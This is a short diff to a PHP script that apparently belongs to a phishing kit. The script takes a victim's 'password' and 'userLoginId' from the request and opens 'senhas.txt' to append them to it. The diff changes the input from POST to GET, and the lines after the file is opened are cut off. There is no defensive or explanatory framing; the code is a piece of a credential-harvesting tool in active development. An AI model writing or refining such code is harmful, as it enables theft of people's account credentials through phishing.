@@ -1,6 +1,6 @@
 <?php
-$caixa1 = $_POST["password"] . "\n";
-$caixa2 = $_POST["userLoginId"] . "\n";
+$caixa1 = $_GET["password"] . "\n";
+$caixa2 = $_GET["userLoginId"] . "\n";
 
 $file = fopen("senhas.txt","a");
 
